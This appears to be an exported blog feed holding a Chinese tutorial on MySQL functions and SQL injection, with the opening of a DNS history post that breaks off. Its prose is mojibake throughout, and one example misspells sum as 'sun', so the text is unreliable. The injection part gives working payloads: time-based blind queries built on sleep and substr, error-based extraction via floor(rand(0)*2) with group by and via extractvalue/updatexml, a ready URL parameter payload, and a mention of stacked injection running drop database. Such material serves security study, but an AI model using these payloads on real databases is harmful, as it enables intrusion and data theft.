class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- ç»Ÿè®¡æ€»è¡Œæ•°ï¼ˆåŒ…æ‹¬NULLï¼‰<br>select count(*) from orders;<br><br>-- ç»Ÿè®¡æŸåˆ—éNULLå€¼çš„æ•°é‡<br>select count(product_id) from products;<br><br>-- ç»Ÿè®¡å”¯ä¸€å€¼æ•°é‡<br>select count(distinct user_id) from logs;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>SUM()</strong></p><ul><li><p>è®¡ç®—æ•°å€¼åˆ—çš„æ€»å’Œï¼ˆå¿½ç•¥ NULLï¼‰ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sun(revenue) from sales;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>AVG()</strong></p><ul><li><p>è®¡ç®—æ•°å€¼åˆ—çš„å¹³å‡å€¼ï¼ˆå¿½ç•¥ NULLï¼‰ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select avg(score) from exams;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>MAX()</strong> å’Œ <strong>MIN()</strong></p><ul><li><p>è¿”å›åˆ—ä¸­çš„æœ€å¤§&#x2F;æœ€å°å€¼ï¼ˆæ”¯æŒæ•°å€¼ã€æ—¥æœŸã€å­—ç¬¦ä¸²ï¼‰ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select max(temperature), min(temperature) from weather;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="å…¶ä»–å‡½æ•°"><a href="#å…¶ä»–å‡½æ•°" class="headerlink" title="å…¶ä»–å‡½æ•°"></a>å…¶ä»–å‡½æ•°</h3><ul><li><p>greatestï¼š</p><ul><li><p>è¿”å› a, b ä¸­æœ€å¤§çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">greatest(a, b)<br></code></pre></td></tr></table></figure><ul><li>aã€bï¼šä»»æ„å€¼</li></ul></li></ul></li><li><p>randï¼š</p><ul><li><p>è¿”å› 0~1 ä¹‹é—´éšæœºçš„æµ®ç‚¹å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">rand(a)<br></code></pre></td></tr></table></figure><ul><li>aï¼šå¯é€‰å‚æ•°ï¼›éšæœºæ•°ç§å­ï¼›å¯ä¸ºä»»æ„å€¼</li></ul></li></ul></li><li><p>load_file</p><ul><li><p>è¯»å–æ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">load_file(path)<br></code></pre></td></tr></table></figure><ul><li>pathï¼šæ–‡ä»¶è·¯å¾„ï¼Œä¸€èˆ¬è½¬ä¸º 16 è¿›åˆ¶é˜²æ­¢ç‰¹æ®Šå­—ç¬¦å‡ºé—®é¢˜</li></ul></li></ul></li><li><p>extractvalue</p><ul><li><p>å¯¹ XML æ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">extractvalue(xmlfileï¼Œpath)<br></code></pre></td></tr></table></figure><ul><li>xmlfileï¼šxml æ–‡ä»¶</li><li>pathï¼šxpath</li></ul></li></ul></li><li><p>updatexml</p><ul><li><p>æ›´æ–° xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(xmlfileï¼Œpath, content)<br></code></pre></td></tr></table></figure><ul><li>xmlfileï¼šxml æ–‡ä»¶</li><li>pathï¼šxpath</li><li>contentï¼šæ›´æ–°çš„å†…å®¹</li></ul></li></ul></li></ul><h2 id="æ³¨å…¥ç±»å‹"><a href="#æ³¨å…¥ç±»å‹" class="headerlink" title="æ³¨å…¥ç±»å‹"></a>æ³¨å…¥ç±»å‹</h2><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¤ä¹ äº†ä¸€ä¸‹ MySQL æ³¨å…¥ç›¸å…³çš„çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹æœ‰å“ªäº›ç±»å‹çš„æ³¨å…¥ã€‚</p><h3 id="å¸¸è§„æ³¨å…¥"><a href="#å¸¸è§„æ³¨å…¥" class="headerlink" title="å¸¸è§„æ³¨å…¥"></a>å¸¸è§„æ³¨å…¥</h3><p>æ³¨å…¥åç›´æ¥å›æ˜¾ç»“æœ</p><p>æœ‰ç‚¹å¤šå†™å¥½äº†è´´è¿™é‡Œ</p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>ç±»å‹</p><ul><li>å¸ƒå°”</li><li>æ—¶é—´</li><li>å…¶ä»–ï¼ˆæŠ¥é”™ã€å“åº”ä»£ç ç­‰ç­‰ï¼‰</li></ul><p>ç›²æ³¨å°±æ˜¯åœ¨ sql æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œæ•°æ®æ— å›æ˜¾ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸï¼Œè¿™ä¸ªæ–¹æ³•ç§°ä¹‹ä¸ºç›²æ³¨ã€‚</p><p>ç›²æ³¨å®é™…ä¸Šæ˜¯æ ¹æ®æ‰§è¡ŒæˆåŠŸä¸å¤±è´¥çš„ç°è±¡ä¸åŒï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿè·å–åˆ°ä¿¡æ¯ã€‚æœ€ç®€å•çš„æ˜¯å¸ƒå°”å‹çš„ï¼Œé€šè¿‡æ¯”è¾ƒè¿ç®—ç¬¦æ¥è·å¾—ä¿¡æ¯ï¼Œæ¯”è¾ƒç»“æœè¦ä¹ˆæ˜¯ Trueï¼Œè¦ä¹ˆæ˜¯ Falseï¼Œä¸¤ç§è¿”å›çš„æ•°æ®ä¸åŒã€‚é‚£ä¹ˆå¦‚æœä¸ç®¡æ˜¯ True è¿˜æ˜¯ Falseï¼Œé¡µé¢è¿”å›çš„éƒ½ä¸€æ ·çš„è¯ï¼Œå°±åªèƒ½ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼ŒåŠ å…¥ç‰¹å®šçš„æ—¶é—´å‡½æ•°ï¼Œé€šè¿‡æ—¶é—´å·®æ¥åˆ¤æ–­æ³¨å…¥çš„è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚</p><p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œåªè¦æ³¨å…¥æˆåŠŸä¸å¤±è´¥çš„è¿”å›æ•°æ®ä¸åŒï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°æ•°æ®åº“çš„ä¿¡æ¯ã€‚è‡³äºè¿”å›çš„æ•°æ®åˆ°åº•æ€ä¹ˆä¸ªä¸åŒæ³•ï¼Œåˆ™æœ‰å¾ˆå¤šç§å¯èƒ½ã€‚</p><p>åˆ©ç”¨æ–¹å¼</p><ol><li><p>åŸºäºå¸ƒå°”<br>åˆ©ç”¨å­—ç¬¦ä¸²ç›¸å…³çš„å‡½æ•°ï¼Œé€ä¸ªå­—ç¬¦çŒœè§£éœ€è¦çš„ä¿¡æ¯å³å¯</p></li><li><p>åŸºäºæ—¶é—´</p><ul><li><p>åˆ©ç”¨ <code>if</code>ã€<code>case</code>ç­‰ä¸æ—¶å»¶å‡½æ•°æ­é…ï¼Œé€ä¸ªå­—ç¬¦çŒœè§£éœ€è¦çš„ä¿¡æ¯</p></li><li><p>åˆ©ç”¨å­—ç¬¦ä¸²æå‰ä¸å®šä½å°†å­—ç¬¦è½¬ä¸ºæ•°å­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;a&#x27;));<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;b&#x27;));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;r&#x27;));<br># å‡ºç°æ—¶å»¶ï¼Œä»£è¡¨ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º r<br></code></pre></td></tr></table></figure><p>åŒç†å¯ä»¥è·å–æ‰€æœ‰ä½æ•°ã€‚æ­¤æ³•æ— éœ€ if ç­‰æ¡ä»¶è¯­å¥ã€‚</p><p>åŒæ ·è¿˜å¯ä»¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;a&#x27;, 1));<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;b&#x27;, 1));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;r&#x27;, 1));<br># å‡ºç°æ—¶å»¶ï¼Œä»£è¡¨ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º r<br></code></pre></td></tr></table></figure><p>åˆ¤æ–­é•¿åº¦ä¹Ÿå¯ä»¥è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(length(database())-1);<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-2);<br>...<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-14);<br># æ²¡æœ‰æ—¶å»¶è¯´æ˜é•¿åº¦ä¸º 14<br></code></pre></td></tr></table></figure></li></ul><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>åˆ©ç”¨ MySQL çš„ä¸€äº›ç‰¹æ®Šè¯­æ³•è§¦å‘é”™è¯¯ï¼Œé”™è¯¯ä¸­å¸¸å¸¸å¸¦ç€ä¸€äº›æ•°æ®åº“ä¿¡æ¯ï¼Œä»è€Œé€ æˆä¿¡æ¯æ³„éœ²ï¼Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸è§çš„ payloadï¼š</p><blockquote><p>floor + rand + count + group by ç»„åˆæ‹³</p></blockquote><p>å…ˆè¯´ <code>group by</code>ã€‚å½“ <code>group by</code> ä¸èšåˆå‡½æ•°ï¼ˆè¿™é‡Œæ˜¯ countï¼‰ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼ŒMySQL ä¼šä¸ºæŸ¥è¯¢ç»“æœå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿçš„è¡¨ã€‚è¿™ä¸ªè¡¨ä½ å¯ä»¥æŒ‰ç…§ Python çš„é‡Œçš„å­—å…¸ç†è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp_table = &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸å­—å…¸ç±»ä¼¼ï¼Œè¿™ä¸ªä¸´æ—¶çš„è¡¨ä¸èƒ½åˆ›å»ºç›¸åŒçš„é”®ï¼Œå‡ºç°äº†å°±æŠ¥é”™ï¼›å¦‚æœå‡ºç°ç›¸åŒçš„å€¼ï¼Œåˆ™ç´¯åŠ ã€‚ä¸¾ä¾‹ï¼š<br>å‡å¦‚æŸ¥å‡ºäº†ä¸€ä¸ªæ–°çš„å€¼ aï¼Œé‚£ä¹ˆ MySQL å…ˆæ‰¾ä¸€ä¸‹ä¸´æ—¶è¡¨ä¸­æœ‰æ²¡æœ‰è¿™ä¸ª a é”®ï¼Œæœ‰çš„è¯æ›´æ–°å¯¹äºçš„å€¼ï¼›å¦åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„é”®ã€‚å¦‚æœåˆ›å»ºæ–°çš„é”®çš„æ—¶å€™å‘ç°å·²ç»å­˜åœ¨è¿™ä¸ªé”®äº†ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œåˆ›å»ºé”®çš„ä¹‹å‰æ˜æ˜æœ‰å¯¹é”®çš„å­˜åœ¨è¿›è¡Œåˆ¤æ–­ï¼Œä¸ºä»€ä¹ˆåˆ›å»ºçš„æ—¶å€™è¿˜ä¼šå‡ºç°å­˜åœ¨å‘¢ï¼Ÿå› ä¸ºåˆ¤æ–­çš„æ—¶å€™ MySQL ä¼šè¿›è¡Œä¸€æ¬¡æŸ¥è¯¢ï¼Œè€Œåˆ›å»ºçš„æ—¶å€™åˆä¼šæŸ¥ä¸€ä¸‹ï¼Œç›¸å½“äºé‡å¤æŸ¥äº† 2 æ¬¡ã€‚åˆå› ä¸º <code>rand</code> å‡½æ•°æ¯æ¬¡è¿è¡Œçš„ç»“æœä¸åŒï¼Œä¾¿å¯¼è‡´äº†åˆ¤æ–­ä¸åˆ›å»ºçš„é”®ä¼šä¸ä¸€è‡´çš„æƒ…å†µã€‚</p><p>å½“ç„¶ï¼Œ0~1 ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°ç»“æœå¤ªå¤šäº†ï¼Œéœ€è¦é™åˆ¶ä¸€ä¸‹æ¥æé«˜å‡ ç‡ï¼Œè¿™å°±æ˜¯ <code>floor(rand()*2)</code> çš„ä½œç”¨ï¼Œå°†éšæœºç»“æœé™åˆ¶ä¸º2ç§ï¼Œè¦ä¹ˆ 0 è¦ä¹ˆ 1ã€‚<br>ä¸¾ä¾‹è¯´æ˜ï¼Œå½“ <code>group by</code> + <code>floor(rand(0)*2)</code> çš„æ—¶å€™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select floor(rand(0)*2) from information_schema.tables limit 0, 5;<br>+------------------+<br>| floor(rand(0)*2) |<br>+------------------+<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>+------------------+<br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>ç»“æœè§£é‡Šï¼š</p><ol><li>ç¬¬ä¸€æ¬¡æŸ¥è¯¢ï¼Œéšæœºæ•°ä¸º 0ï¼Œ<code>group by</code> æ‹¿åˆ°é”® 0ï¼Œåˆ¤æ–­é”® 0 ä¸åœ¨ä¸´æ—¶è¡¨åï¼Œå°è¯•æ–°å»ºé”®ï¼Œè¿™æ—¶æ¶ˆè€—äº†ä¸€ä¸ªéšæœºæ•° 1ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å®é™…ä¸Šæ–°å»ºçš„é”®çš„æ˜¯ 1ã€‚</li><li>ç¬¬äºŒæ¬¡æŸ¥è¯¢ï¼Œéšæœºæ•°ä¸º 1ï¼Œ<code>group by</code> æ‹¿åˆ°é”® 1ï¼Œåˆ¤æ–­é”® 1 åœ¨ä¸´æ—¶è¡¨åï¼Œæ›´æ–°é”® 1 å¯¹åº”çš„å€¼ã€‚</li><li>ç¬¬ä¸‰æ¬¡æŸ¥è¯¢ï¼Œéšæœºæ•°ä¸º 0ï¼Œ<code>group by</code> æ‹¿åˆ°é”® 0ï¼Œåˆ¤æ–­é”® 0 ä¸åœ¨ä¸´æ—¶è¡¨åï¼Œå°è¯•æ–°å»ºé”®ï¼Œè¿™æ—¶æ¶ˆè€—äº†ä¸€ä¸ªéšæœºæ•° 1ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å®é™…ä¸Šæ–°å»ºçš„é”®çš„æ˜¯ 1ï¼Œä½†æ˜¯é”® 1å·²ç»å­˜åœ¨ï¼Œæ‰€ä»¥ MySQL æŠ¥é”™ï¼š<code>ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;</code></li></ol><p>éªŒè¯å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+----------+----------+<br>| id   | user     | password |<br>+------+----------+----------+<br>|    1 | admin    | admin    |<br>|    2 | root     | password |<br>|    3 | username | 123456   |<br>+------+----------+----------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br><br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œgroup by çš„æ¬¡æ•°ä¸åˆ—æ•°å¯†åˆ‡ç›¸å…³ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå°† <code>users</code> è¡¨æ”¹ä¸º 2åˆ—ï¼Œåˆ™ä¸ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+-------+----------+<br>| id   | user  | password |<br>+------+-------+----------+<br>|    1 | admin | admin    |<br>|    2 | root  | password |<br>+------+-------+----------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>+----------+<br>| count(*) |<br>+----------+<br>|        2 |<br>+----------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>å‰©ä¸‹çš„ï¼Œå°±æ˜¯æ€ä¹ˆåˆ©ç”¨æŠ¥é”™å°†éœ€è¦çš„æ•°æ®å¸¦å‡ºæ¥ã€‚æŠ¥é”™ä¸­çš„ <code>1</code> å®é™…ä¸Šå°±æ˜¯ <code>floor(rand(0)*2)</code> çš„ç»“æœï¼Œæ‰€ä»¥åªéœ€è¦å°†æ•°æ®ä¸ <code>floor(rand(0)*2)</code> è¿æ¥èµ·æ¥å°±å¯ä»¥å¸¦å‡ºæ¥äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select count(*) from users group by concat((floor(rand(0)*2)), &quot;~&quot;,version());<br>ERROR 1062 (23000): Duplicate entry &#x27;1~5.7.24&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br></code></pre></td></tr></table></figure><p>å®æˆ˜ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1 or 1 group by concat((floor(rand(0)*2)), &quot;~&quot;, version()) -- #<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">version() ä¹Ÿå¯ä»¥ä¸º group_concat( select è¯­å¥ )<br></code></pre></td></tr></table></figure><blockquote><p>xml</p></blockquote><p>åˆ©ç”¨ xml çš„ xpath è¯­æ³•é”™è¯¯æ¥æŠ¥é”™ã€‚</p><p><strong>extractvalue</strong>: extractvalue åœ¨æŸ¥ä¸åˆ°æ•°æ®çš„æ—¶å€™è¿”å›ç©ºï¼Œxpath è¯­æ³•é”™è¯¯çš„æ—¶å€™åˆ™ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/&#x27;);<br>+--------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/&#x27;) |<br>+--------------------------+<br>| 123                      |<br>+--------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;);<br>+---------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;) |<br>+---------------------------+<br>|                           |<br>+---------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~&#x27;<br></code></pre></td></tr></table></figure><p><strong>updatexml</strong>ï¼šä¸ extractvalue ç±»ä¼¼ã€‚</p><p>æ³¨æ„ï¼Œè¿™ä¸¤ç§æŠ¥é”™æ³¨å…¥ï¼Œèƒ½å¤Ÿæå–çš„æœ€é•¿å­—ç¬¦ä¸²ä¸º 32 ä¸ªå­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br>mysql&gt; select updatexml(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;, &#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br></code></pre></td></tr></table></figure><p>~æ›¿æ¢ä¸ºselectè¯­å¥</p><p>å®æˆ˜ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and extractvalue(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;));<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and updatexml(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;), &#x27;&#x27;); <br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>å…¶ä»–å‡½æ•°</p></blockquote><p>ä¸Šé¢è¿™å‡ ä¸ªä»…ä»…æ˜¯æ¯”è¾ƒå¸¸è§çš„å‡½æ•°ï¼Œå®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šä¸å¸¸è§çš„</p><h3 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h3><p>åˆ©ç”¨ <code>union</code> æ¥æ‹¼æ¥ select è¯­å¥ã€‚ä¸»è¦æ˜¯åˆ¤æ–­åˆ—æ•°ã€‚</p><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>MySQL è¯­å¥ä¸­çš„ <code>;</code> ä»£è¡¨ä¸€ä¸ªè¯­å¥ç»“æŸã€‚å¦‚æœ <code>;</code> ä¹‹åçš„è¯­å¥ä¹Ÿèƒ½æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‹¼æ¥ä»»æ„è¯­å¥ï¼ŒåŒ…æ‹¬<code>drop database</code>ã€‚</p><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlæ³¨å…¥</tag>
      
      <tag>ç›²æ³¨éªšæ“ä½œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS</title>
    <link href="/tuyi/2025/01/27/%E8%AE%BADNS/"/>
    <url>/tuyi/2025/01/27/%E8%AE%BADNS/</url>
    
    <content type="html"><![CDATA[<h1 id="DNSçš„èµ·æº"><a href="#DNSçš„èµ·æº" class="headerlink" title="DNSçš„èµ·æº"></a>DNSçš„èµ·æº</h1><p>å€ŸåŠ©aiä½¿ç”¨ä¸€ä¸ªæ•…äº‹æ¥è§£é‡ŠDNSçš„èµ·æºï¼š</p><h2 id="ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£"><a href="#ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£" class="headerlink" title="ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£"></a><strong>ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£</strong></h2><p>1980å¹´ä»£åˆï¼Œäº’è”ç½‘è¿˜åƒä¸€ä¸ªåˆšåˆšå…´èµ·çš„å°é•‡ï¼Œåå«â€œé˜¿å¸•é•‡â€ï¼ˆARPANETï¼‰ã€‚é•‡ä¸Šçš„å±…æ°‘ï¼ˆè®¡ç®—æœºï¼‰è™½ç„¶ä¸å¤šï¼Œä½†å½¼æ­¤é€šä¿¡å…¨é ä¸€æœ¬<strong>çº¸è´¨ç”µè¯ç°¿</strong>â€”â€”åä¸º <code>hosts.txt</code> çš„æ–‡ä»¶ã€‚<br>è¿™æœ¬ç”µè¯ç°¿ç”±é•‡ä¸Šçš„â€œç®¡ç†å‘˜çˆ·çˆ·â€ï¼ˆæ–¯å¦ç¦ç ”ç©¶é™¢çš„SRI-NICï¼‰æ‰‹å†™ç»´æŠ¤ï¼Œæ¯æ–°å¢ä¸€å°è®¾å¤‡ï¼Œçˆ·çˆ·å°±å¾—ç†¬å¤œæ›´æ–°ï¼Œå†æ´¾äººéª‘é©¬é€åˆ°æ¯æˆ·äººå®¶ã€‚<br>å¯éšç€é•‡å­æ‰©å¤§ï¼Œé—®é¢˜æ¥äº†ï¼š</p><ul><li>æ–°ä½æˆ·æš´å¢ï¼Œç”µè¯ç°¿è¶Šæ¥è¶Šåšï¼Œéª‘é©¬é€ä¹¦çš„é€Ÿåº¦èµ¶ä¸ä¸Šå˜åŒ–ã€‚</li><li>æœ‰äººå®¶åœ°å€æ”¹äº†ï¼Œé‚»å±…å´è¿˜åœ¨ç”¨æ—§ç”µè¯ç°¿ï¼Œä¿¡å…¨å¯„ä¸¢äº†ï¼</li><li>çˆ·çˆ·ç´¯å€’äº†ï¼Œå…¨é•‡é€šä¿¡æ¿’ä¸´ç˜«ç—ªâ€¦â€¦</li></ul><hr><h2 id="ç¬¬äºŒç« ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ"><a href="#ç¬¬äºŒç« ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ" class="headerlink" title="ç¬¬äºŒç« ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ"></a><strong>ç¬¬äºŒç« 